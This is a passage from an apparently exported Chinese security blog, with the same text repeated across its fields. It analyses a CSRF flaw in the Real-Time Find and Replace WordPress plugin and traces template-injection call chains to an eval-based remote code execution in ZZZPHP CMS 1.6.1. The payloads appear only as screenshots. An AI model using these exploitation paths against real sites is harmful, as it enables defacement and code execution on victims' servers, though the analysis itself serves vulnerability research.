data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164548-fd754fb2-8abe-1.png\" alt=\"bbf929c1d7c8d3c0d60c8e4170c3319f.png\"></p>\n<p>parent_slug- 父菜单的子名称（或标准WordPress管理页面的文件名）<br>page_title- 选择菜单后在页面标题标签中显示的文本<br>menu_title- 菜单中使用的文本<br>capability- 向用户显示此菜单所需的功能<br>menu_slug- 别名，用于引用此菜单<br>function- 用于输出此页面内容的函数</p>\n<p>这里重点看下parent_slug参数和function参数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164607-08b7170c-8abf-1.png\" alt=\"7b72b94b45d31844c223a48c831460cf.png\"></p>\n<p>parent_slug参数值为tools.php 因此这里是在工具菜单栏处添加此子菜单</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164625-136c81d2-8abf-1.png\" alt=\"ca6773d2b4c3d18c8ff498daaf4fb49e.png\"></p>\n<p>从后台页面显示结果来看，的确如此</p>\n<p>除此之外，通过parent_slug参数，可以在如下不同位置添加子菜单<br>1、在仪表盘菜单处: add_submenu_page( ‘index.php’, … );<br>2、在文章菜单处: add_submenu_page( ‘edit.php’, … );<br>3、在媒体菜单处: add_submenu_page( ‘upload.php’, … );<br>4、在链接菜单处: add_submenu_page( ‘link-manager.php’, … );<br>5、在页面菜单处: add_submenu_page( ‘edit.php?post_type=page’, … );<br>6、在评论菜单处: add_submenu_page( ‘edit-comments.php’, … );<br>7、在自定义文章类型菜单处: add_submenu_page(‘edit.php?post_type=your_post_type’,…)<br>8、在外观菜单处: add_submenu_page( ‘themes.php’, … );<br>9、在插件菜单处: add_submenu_page( ‘plugins.php’, … );<br>10、在用户菜单处: add_submenu_page( ‘users.php’, … );<br>11、在工具菜单处: add_submenu_page( ‘tools.php’, … );<br>12、在设置菜单处: add_submenu_page( ‘options-general.php’, … );</p>\n<p>接着来看add_submenu_page方法的function参数：</p>\n<p>function参数指定用于输出此页面内容的函数。这里指定的是far_options_page，也就是要用far_options_page来输出页面信息</p>\n<p>关于add_submenu_page方法需要了解的就这么多，继续往下看</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164647-2070a782-8abf-1.png\" alt=\"72da527a711d6c435a6714f6a7e007ba.png\"></p>\n<p>可见19行有一处add_action( “admin_print_scripts-$page”, ‘far_admin_scripts’);代码<br>接下来介绍下add_action的首参，admin_print_scripts-$page是什么<br>$page是add_submenu_page方法的返回值，add_submenu_page方法在添加子菜单成功后，会将子菜单的对应页面的page_hook作为返回值返回</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164704-2a7cbbd0-8abf-1.png\" alt=\"757f1f960384127672baf4b7e2147074.png\"></p>\n<p>这里的$page值为tools_page_real-time-find-and-replace。使用add_submenu_page方法注册的子菜单page_hook都是唯一的，程序也是通过这个值来区分我们注册的不同页面</p>\n<p>如果想理解admin_print_scripts-(page_hook)，不妨先看看和它很相似的admin_print_script方法：</p>\n<p>admin_print_scripts方法用来给WordPress后台页面引入js与css文件。使用这个钩子会在所有WordPress后台页面中引入js与css文件。</p>\n<p>实际操作中往往不需要在WordPress后台所有页面中加载同一组js与css文件，而是在指定页面中引入指定的js或css文件，这里就需要使用admin_print_scripts-(page_hook)方法。</p>\n<p>admin_print_scripts-(page_hook)方法中的page_hook部分指定了需要加载js或css文件的页面。在这个插件代码中，通过add_action(“admin_print_scripts-$page”, ‘far_admin_scripts’<br>);在admin_print_scripts-tools_page_real-time-find-and-replace页面中加载far_admin_scripts函数，而far_admin_scripts函数中指定了要引入的js与css文件，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164719-33638274-8abf-1.png\" alt=\"905f66c00b87f1a6ef28bf05c68dc57a.png\"></p>\n<p>引入的这些js与css文件，将在add_submenu_page方法function参数渲染生成页面时生效。</p>\n<p>在弄清楚插件是如何注册后，通过访问工具菜单栏中的real-time-find-and-replace子菜单，即可进入存在漏洞的页面，该页面即为far_options_page函数加载far_admin_scripts函数中引入的js与css文件后所渲染的结果</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164734-3c5dee8c-8abf-1.png\" alt=\"d88fef128adca1bf8e50571a515b22f8.png\"></p>\n<h4 id=\"Real-Time-Find-and-Replace插件是如何工作的\"><a href=\"#Real-Time-Find-and-Replace插件是如何工作的\" class=\"headerlink\" title=\"Real-Time Find and Replace插件是如何工作的\"></a>Real-Time Find and Replace插件是如何工作的</h4><p>这一部分比较有意思。在看代码之前，通过Real-Time Find and Replace插件的介绍来看，这个插件可以实时查找和替换网站页面中的数据。但这一点是如何做到的呢？我一度以为这个插件可以遍历读取所有的页面文件，对文件内容直接进行搜索与替换，但这样实现未免太繁琐了。</p>\n<p>跟踪代码可以发现，实际的实现很巧妙。<br>wp-content\\plugins\\real-time-find-and-replace\\real-time-find-and-replace.php中可看到下列代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164748-44eb0e0e-8abf-1.png\" alt=\"26bc22727d784d8be2f85d642f5ef4ac.png\"></p>\n<p>在real-time-find-and-replace.php文件代码的最后一行，通过add_action将far_template_redirect函数连接到template_redirect钩子上。template_redirect钩子将会在显示所请求页面的模板文件前执行，以便插件改写对模板文件的选择。</p>\n<p>接着看下far_template_redirect函数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164803-4de5b928-8abf-1.png\" alt=\"9bdb6ec554c9201d061921dcc47d1a49.png\"></p>\n<p>far_template_redirect中使用ob_start函数打开输出缓冲区，将所请求页面的模板文件信息保存在输出缓冲区中,并使用far_ob_call函数处理输出结果。</p>\n<p>far_ob_call函数对所请求页面的模板文件内容进行搜索与替换</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164817-561c5688-8abf-1.png\" alt=\"f8378a24d0122989baa092ab5476883a.png\"></p>\n<p>因此最终输出的页面中内容被修改，但是页面文件自身并不会被修改</p>\n<h3 id=\"进入正题\"><a href=\"#进入正题\" class=\"headerlink\" title=\"进入正题\"></a>进入正题</h3><p>通过预备知识部分可知real-time-find-and-replace插件是如何在工具菜单注册的子菜单、页面是如何渲染和以及如何工作的。与预备知识相比之下，本次漏洞就显得比较简单</p>\n<p>本次漏洞就出在了real-time-find-and-replace插件管理页面，该页面提供了wordpress页面全局搜索与替换的功能</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164838-62a85690-8abf-1.png\" alt=\"b604e176acd9407f201e540c7bf1d022.png\"></p>\n<p>执行完毕之后，wordpress中所有&lt;head&gt;在输出时将会被替换</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164852-6a9cec4e-8abf-1.png\" alt=\"09035470d5a809820349ff1442060920.png\"></p>\n<p>从下图代码可见替换后的结果</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164904-72304adc-8abf-1.png\" alt=\"13c1b3baeadfb1ab8ddff270113f18ec.png\"></p>\n<p>这个功能虽然很强大，但正常情况下也只有管理员才可以使用这个功能</p>\n<p>我们抓一个替换操作的数据包来分析下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164917-79ce011c-8abf-1.png\" alt=\"4f03d99860e03e628e393768df90fd7e.png\"></p>\n<p>Post提交的数据中仅仅包含替换相关的属性值，并没有csrf token</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164933-8352a3be-8abf-1.png\" alt=\"d0c3f27ffc8ef673e2b297882cea5873.png\"></p>\n<p>从上图代码中也可以看到，这个功能并没有校验csrf token。攻击者可以伪造连接诱骗管理员点击，通过csrf攻击使管理员发送请求使用real-time-find-and-replace插件提供的功能，用新内容或恶意代码替换网站上的任何页面信息。当攻击成功后，浏览任意页面均可受到攻击。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>开发者一个小小的疏忽，往往会导致很严重的后果。漏洞成因很简单，但是影响还是比较严重的。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Real-Time Find and Replace是一个可以实时查找和替换WordPress网页数据的插件。据统计，该漏洞已安装在100,000多个站点上。</p>\n<p>近日Real-Time Find and Replace 3.9版本被披露存在一处高度严重的安全问题：由于Real-Time Find andReplace的核心功能模块并没有采用随机数来校验请求的合法性，从而导致跨站点请求伪造（CSRF）漏洞的产生。攻击者可以利用此漏洞，使用恶意代码替换目标站点页面上的任何内容。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><h3 id=\"预备知识\"><a href=\"#预备知识\" class=\"headerlink\" title=\"预备知识\"></a>预备知识</h3><p>这一部分是对本次漏洞分析过程中涉及到的WordPress一些函数与机制的介绍，如果对WordPress很了解可以直接跳过</p>\n<h4 id=\"Real-Time-Find-and-Replace插件是如何注册的\"><a href=\"#Real-Time-Find-and-Replace插件是如何注册的\" class=\"headerlink\" title=\"Real-Time Find and Replace插件是如何注册的\"></a>Real-Time Find and Replace插件是如何注册的</h4><p>首先分析下Real-Time Find and Replace插件是如何注册到wordpress的菜单栏中的，以及WordPress是如何调用该插件</p>\n<p>real-time-find-and-replace插件代码很少，只有一个php文件real-time-find-and-replace.php</p>\n<p>首先看wp-content\\plugins\\real-time-find-and-replace\\real-time-find-and-replace.php 17行处的far_add_pages方法，该方法中使用add_submenu_page方法对wordpress的顶级菜单添加子菜单</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164531-f3045c08-8abe-1.png\" alt=\"a7c7059870cfb1d648bc0bb65436a0e4.png\"></p>\n<p>add_submenu_page方法的参数说明如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164548-fd754fb2-8abe-1.png\" alt=\"bbf929c1d7c8d3c0d60c8e4170c3319f.png\"></p>\n<p>parent_slug- 父菜单的子名称（或标准WordPress管理页面的文件名）<br>page_title- 选择菜单后在页面标题标签中显示的文本<br>menu_title- 菜单中使用的文本<br>capability- 向用户显示此菜单所需的功能<br>menu_slug- 别名，用于引用此菜单<br>function- 用于输出此页面内容的函数</p>\n<p>这里重点看下parent_slug参数和function参数</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164607-08b7170c-8abf-1.png\" alt=\"7b72b94b45d31844c223a48c831460cf.png\"></p>\n<p>parent_slug参数值为tools.php 因此这里是在工具菜单栏处添加此子菜单</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164625-136c81d2-8abf-1.png\" alt=\"ca6773d2b4c3d18c8ff498daaf4fb49e.png\"></p>\n<p>从后台页面显示结果来看，的确如此</p>\n<p>除此之外，通过parent_slug参数，可以在如下不同位置添加子菜单<br>1、在仪表盘菜单处: add_submenu_page( ‘index.php’, … );<br>2、在文章菜单处: add_submenu_page( ‘edit.php’, … );<br>3、在媒体菜单处: add_submenu_page( ‘upload.php’, … );<br>4、在链接菜单处: add_submenu_page( ‘link-manager.php’, … );<br>5、在页面菜单处: add_submenu_page( ‘edit.php?post_type=page’, … );<br>6、在评论菜单处: add_submenu_page( ‘edit-comments.php’, … );<br>7、在自定义文章类型菜单处: add_submenu_page(‘edit.php?post_type=your_post_type’,…)<br>8、在外观菜单处: add_submenu_page( ‘themes.php’, … );<br>9、在插件菜单处: add_submenu_page( ‘plugins.php’, … );<br>10、在用户菜单处: add_submenu_page( ‘users.php’, … );<br>11、在工具菜单处: add_submenu_page( ‘tools.php’, … );<br>12、在设置菜单处: add_submenu_page( ‘options-general.php’, … );</p>\n<p>接着来看add_submenu_page方法的function参数：</p>\n<p>function参数指定用于输出此页面内容的函数。这里指定的是far_options_page，也就是要用far_options_page来输出页面信息</p>\n<p>关于add_submenu_page方法需要了解的就这么多，继续往下看</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164647-2070a782-8abf-1.png\" alt=\"72da527a711d6c435a6714f6a7e007ba.png\"></p>\n<p>可见19行有一处add_action( “admin_print_scripts-$page”, ‘far_admin_scripts’);代码<br>接下来介绍下add_action的首参，admin_print_scripts-$page是什么<br>$page是add_submenu_page方法的返回值，add_submenu_page方法在添加子菜单成功后，会将子菜单的对应页面的page_hook作为返回值返回</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164704-2a7cbbd0-8abf-1.png\" alt=\"757f1f960384127672baf4b7e2147074.png\"></p>\n<p>这里的$page值为tools_page_real-time-find-and-replace。使用add_submenu_page方法注册的子菜单page_hook都是唯一的，程序也是通过这个值来区分我们注册的不同页面</p>\n<p>如果想理解admin_print_scripts-(page_hook)，不妨先看看和它很相似的admin_print_script方法：</p>\n<p>admin_print_scripts方法用来给WordPress后台页面引入js与css文件。使用这个钩子会在所有WordPress后台页面中引入js与css文件。</p>\n<p>实际操作中往往不需要在WordPress后台所有页面中加载同一组js与css文件，而是在指定页面中引入指定的js或css文件，这里就需要使用admin_print_scripts-(page_hook)方法。</p>\n<p>admin_print_scripts-(page_hook)方法中的page_hook部分指定了需要加载js或css文件的页面。在这个插件代码中，通过add_action(“admin_print_scripts-$page”, ‘far_admin_scripts’<br>);在admin_print_scripts-tools_page_real-time-find-and-replace页面中加载far_admin_scripts函数，而far_admin_scripts函数中指定了要引入的js与css文件，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164719-33638274-8abf-1.png\" alt=\"905f66c00b87f1a6ef28bf05c68dc57a.png\"></p>\n<p>引入的这些js与css文件，将在add_submenu_page方法function参数渲染生成页面时生效。</p>\n<p>在弄清楚插件是如何注册后，通过访问工具菜单栏中的real-time-find-and-replace子菜单，即可进入存在漏洞的页面，该页面即为far_options_page函数加载far_admin_scripts函数中引入的js与css文件后所渲染的结果</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164734-3c5dee8c-8abf-1.png\" alt=\"d88fef128adca1bf8e50571a515b22f8.png\"></p>\n<h4 id=\"Real-Time-Find-and-Replace插件是如何工作的\"><a href=\"#Real-Time-Find-and-Replace插件是如何工作的\" class=\"headerlink\" title=\"Real-Time Find and Replace插件是如何工作的\"></a>Real-Time Find and Replace插件是如何工作的</h4><p>这一部分比较有意思。在看代码之前，通过Real-Time Find and Replace插件的介绍来看，这个插件可以实时查找和替换网站页面中的数据。但这一点是如何做到的呢？我一度以为这个插件可以遍历读取所有的页面文件，对文件内容直接进行搜索与替换，但这样实现未免太繁琐了。</p>\n<p>跟踪代码可以发现，实际的实现很巧妙。<br>wp-content\\plugins\\real-time-find-and-replace\\real-time-find-and-replace.php中可看到下列代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164748-44eb0e0e-8abf-1.png\" alt=\"26bc22727d784d8be2f85d642f5ef4ac.png\"></p>\n<p>在real-time-find-and-replace.php文件代码的最后一行，通过add_action将far_template_redirect函数连接到template_redirect钩子上。template_redirect钩子将会在显示所请求页面的模板文件前执行，以便插件改写对模板文件的选择。</p>\n<p>接着看下far_template_redirect函数</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164803-4de5b928-8abf-1.png\" alt=\"9bdb6ec554c9201d061921dcc47d1a49.png\"></p>\n<p>far_template_redirect中使用ob_start函数打开输出缓冲区，将所请求页面的模板文件信息保存在输出缓冲区中,并使用far_ob_call函数处理输出结果。</p>\n<p>far_ob_call函数对所请求页面的模板文件内容进行搜索与替换</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164817-561c5688-8abf-1.png\" alt=\"f8378a24d0122989baa092ab5476883a.png\"></p>\n<p>因此最终输出的页面中内容被修改，但是页面文件自身并不会被修改</p>\n<h3 id=\"进入正题\"><a href=\"#进入正题\" class=\"headerlink\" title=\"进入正题\"></a>进入正题</h3><p>通过预备知识部分可知real-time-find-and-replace插件是如何在工具菜单注册的子菜单、页面是如何渲染和以及如何工作的。与预备知识相比之下，本次漏洞就显得比较简单</p>\n<p>本次漏洞就出在了real-time-find-and-replace插件管理页面，该页面提供了wordpress页面全局搜索与替换的功能</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164838-62a85690-8abf-1.png\" alt=\"b604e176acd9407f201e540c7bf1d022.png\"></p>\n<p>执行完毕之后，wordpress中所有&lt;head&gt;在输出时将会被替换</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164852-6a9cec4e-8abf-1.png\" alt=\"09035470d5a809820349ff1442060920.png\"></p>\n<p>从下图代码可见替换后的结果</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164904-72304adc-8abf-1.png\" alt=\"13c1b3baeadfb1ab8ddff270113f18ec.png\"></p>\n<p>这个功能虽然很强大，但正常情况下也只有管理员才可以使用这个功能</p>\n<p>我们抓一个替换操作的数据包来分析下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164917-79ce011c-8abf-1.png\" alt=\"4f03d99860e03e628e393768df90fd7e.png\"></p>\n<p>Post提交的数据中仅仅包含替换相关的属性值，并没有csrf token</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200430164933-8352a3be-8abf-1.png\" alt=\"d0c3f27ffc8ef673e2b297882cea5873.png\"></p>\n<p>从上图代码中也可以看到，这个功能并没有校验csrf token。攻击者可以伪造连接诱骗管理员点击，通过csrf攻击使管理员发送请求使用real-time-find-and-replace插件提供的功能，用新内容或恶意代码替换网站上的任何页面信息。当攻击成功后，浏览任意页面均可受到攻击。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>开发者一个小小的疏忽，往往会导致很严重的后果。漏洞成因很简单，但是影响还是比较严重的。</p>\n"},{"title":"Web漏洞分析之——顺瓜摸藤","date":"2019-03-04T06:18:28.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n在分析一些漏洞时，能从相关的漏洞预警和描述中获取的情报往往很少。\n很多时候，只能通过漏洞描述或者补丁中找到漏洞触发点，然而如何利用，如何找到从入口贯通到漏洞触发点的利用链，这时候就需要我们顺瓜摸藤了。\n在分析一些漏洞时，能从相关的漏洞预警和描述中获取的情报往往很少。\n\n很多时候，只能通过漏洞描述或者补丁中找到漏洞触发点，然而如何利用，如何找到从入口贯通到漏洞触发点的利用链，这时候就需要我们顺瓜摸藤了。\n\n有时候，顺着一个瓜（漏洞触发点），还能摸到很多条藤（利用链）。\n\n<!--more-->\n\n## 前言\n\n近日在PacketStorm看到一个关于国产cms的cve\n\nhttps://packetstormsecurity.com/files/151824/ZZZPHP-CMS-1.6.1-Remote-Code-Execution.html\n\n&nbsp;\n\n**cve编号:**\n\nCVE-2019-9041\n\n&nbsp;\n\n**cve描述**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/1-1024x124.png)\n\n&nbsp;\n\n再看看packetstormsecurity上关于exploit的介绍\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/2.png)\n\n根据描述，猜测该漏洞应为SSTI类\n\n如果有升级补丁参照看一下，这个漏洞就很明朗了。\n\n然而官网上最新版本只是2019-1-28更新的1.6.1，而1.6.1版本，正是存在漏洞的版本。\n\n之前完全没有听说过这个cms，这个漏洞又有cve。\n\n因此拿着个来举个例子，看看怎么**顺瓜摸藤**。\n\n&nbsp;\n\n## 分析\n\n从漏洞发现者所提供的exploit来看，这个漏洞的触发应该是需要后台权限。漏洞触发点位于inc/zzz_template.php中的parserIfLabel方法中，并且需要修改search模板并通过搜索功能执行该利用点。\n\n首先先看下inc/zzz_template.php中的parserIfLabel方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/4.png)\n\n可以看到有一处eval方法，这个应该是最终代码执行触发的地方。\n\n既然触发点已经找到了，那继续往上跟，找到可用的调用链\n\n&nbsp;\n\nparserIfLabel方法只在两处被调用\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/5.png)\n\n&nbsp;\n\n先看位于第2238行的第二处调用\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/6.png)\n\n这处在parserIfLabel方法自身内部，递归调用来解析嵌套。此处虽然调用了parserIfLabel方法，但是并不处于parserIfLabel方法的调用链的上层，因此排除。\n\n&nbsp;\n\n再看第一处：位于23行这处\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/7.png)\n\nparserCommom方法调用parserIfLabel方法并将$zcontent传入其中。\n\n&nbsp;\n\n再看看parserCommom方法在何处被调用\n\n跟入zzz_client.php中\n\nzzz_client.php中一共四处调用了parserCommom方法，每一处都将名为$zcontent的参数传入其中。\n\n&nbsp;\n\n这四处parserCommom分别位于四个ifelse条件中。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/8.png)\n\n&nbsp;\n\n先一处处来看，首先选个短的看起来容易触发的条件分支先来。\n\n先看第二处，这里elseif中的条件最短，为 $conf['iscache']==1\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/9.png)\n\n只要$conf['iscache']==1，就可以顺利的进入这个条件分支，parserCommom就能有机会被调用\n\n查看配置文件，此处默认为0\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/10.png)\n\n&nbsp;\n\n但是由于漏洞介绍，这是个后台漏洞，那默认我们可以有后台的操作权限\n\n于是我在后台管理那把缓存开启了\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/11.png)\n\n&nbsp;\n\n现在zzz_config.php中\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/12.png)\n\n可见iscache现在为1了。\n\n&nbsp;\n\n现在的思路：\n\n1、$conf['iscache'] 目前已经是1，稳稳的进入这个elseif分支\n\n2、由于此处执行点位于zzz_client.php中，而zzz_client.php文件中没有定义任何函数，代码逐行执行，一马平川。\n\n3、只有找到zzz_client.php被加载的地方，才能进入该elseif分支执行我们的parserCommom\n\n4、找到控制传入parserCommom方法中$zcontent值的方法，将构造好的$zcontent传入我们的eval中执行。\n\n&nbsp;\n\n首先要找zzz_client.php被加载的地方\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/14.png)\n\n看起来这四处都可以加载zzz_client.php\n\n我们首先选主入口index.php\n\n&nbsp;\n\n不出意外，直接执行到断点处\n\n此时传入load_file方法中$tplfile值为\n\nC:/wamp64/www/analysis/zzzphp/template/pc/cn2016/html/index.html\n\n加载的是index.html模板\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/15.png)\n\n&nbsp;\n\n也就是说，我们只要在index.html中加入payload，就可以触发底层的eval执行任意代码。\n\n&nbsp;\n\n找到后台编辑模板处\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/16.png)\n\n&nbsp;\n\n编辑index.html,插入payload\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/11-1.png)\n\n成功执行\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/19.png)![](http://blog.nsfocus.net/wp-content/uploads/2019/03/18-300x201.png)\n\n但是需要注意的是 如下图\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/20.png)\n\n当cachefile在第一次执行create_file后，就会被成功创建\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/21-300x150.png)\n\n下一次再进入elseif($conf['iscache']==1)分支后,\n\n由于\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/22.png)\n\n这个if条件不满足\n\n不会再次调用$parser-&gt;parserCommom($zcontent)的。\n\n总结来说，此处可以远程代码执行，但是当cachefile被创建后，此处调用链失效。\n\n&nbsp;\n\n到此为止，我们找到了一处不同于原作者的利用链。但仅仅zzz_client中就有四个分支调用了存在漏洞的函数。\n\n也就是说，同一个漏洞触发点所生产的利用链远远不止两处，有兴趣的朋友也可以自己试试。\n\n&nbsp;\n\n## 总结\n\n在分析一个漏洞时，当找到存在漏洞的部位时，不妨仔细的检查下这个存在漏洞的方法在何处被调用，为什么被调用，实现了什么功能。不拘泥于漏洞作者给出的poc，也许可以找到其他的利用链进行利用。","source":"_posts/ZZZPHP-CMS-1-6-1-Remote-Code-Execution.md","raw":"---\ntitle: Web漏洞分析之——顺瓜摸藤\ndate: 2019-03-4 14:18:28\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n在分析一些漏洞时，能从相关的漏洞预警和描述中获取的情报往往很少。\n很多时候，只能通过漏洞描述或者补丁中找到漏洞触发点，然而如何利用，如何找到从入口贯通到漏洞触发点的利用链，这时候就需要我们顺瓜摸藤了。\n在分析一些漏洞时，能从相关的漏洞预警和描述中获取的情报往往很少。\n\n很多时候，只能通过漏洞描述或者补丁中找到漏洞触发点，然而如何利用，如何找到从入口贯通到漏洞触发点的利用链，这时候就需要我们顺瓜摸藤了。\n\n有时候，顺着一个瓜（漏洞触发点），还能摸到很多条藤（利用链）。\n\n<!--more-->\n\n## 前言\n\n近日在PacketStorm看到一个关于国产cms的cve\n\nhttps://packetstormsecurity.com/files/151824/ZZZPHP-CMS-1.6.1-Remote-Code-Execution.html\n\n&nbsp;\n\n**cve编号:**\n\nCVE-2019-9041\n\n&nbsp;\n\n**cve描述**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/1-1024x124.png)\n\n&nbsp;\n\n再看看packetstormsecurity上关于exploit的介绍\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/2.png)\n\n根据描述，猜测该漏洞应为SSTI类\n\n如果有升级补丁参照看一下，这个漏洞就很明朗了。\n\n然而官网上最新版本只是2019-1-28更新的1.6.1，而1.6.1版本，正是存在漏洞的版本。\n\n之前完全没有听说过这个cms，这个漏洞又有cve。\n\n因此拿着个来举个例子，看看怎么**顺瓜摸藤**。\n\n&nbsp;\n\n## 分析\n\n从漏洞发现者所提供的exploit来看，这个漏洞的触发应该是需要后台权限。漏洞触发点位于inc/zzz_template.php中的parserIfLabel方法中，并且需要修改search模板并通过搜索功能执行该利用点。\n\n首先先看下inc/zzz_template.php中的parserIfLabel方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/4.png)\n\n可以看到有一处eval方法，这个应该是最终代码执行触发的地方。\n\n既然触发点已经找到了，那继续往上跟，找到可用的调用链\n\n&nbsp;\n\nparserIfLabel方法只在两处被调用\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/5.png)\n\n&nbsp;\n\n先看位于第2238行的第二处调用\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/6.png)\n\n这处在parserIfLabel方法自身内部，递归调用来解析嵌套。此处虽然调用了parserIfLabel方法，但是并不处于parserIfLabel方法的调用链的上层，因此排除。\n\n&nbsp;\n\n再看第一处：位于23行这处\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/7.png)\n\nparserCommom方法调用parserIfLabel方法并将$zcontent传入其中。\n\n&nbsp;\n\n再看看parserCommom方法在何处被调用\n\n跟入zzz_client.php中\n\nzzz_client.php中一共四处调用了parserCommom方法，每一处都将名为$zcontent的参数传入其中。\n\n&nbsp;\n\n这四处parserCommom分别位于四个ifelse条件中。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/03/8.png)\n\n&nbsp;\n\n先一处处来看，首先选个短的看起来容易触发的条件分支先来。\n\n先看第二处，这里elseif中的条件最短，为 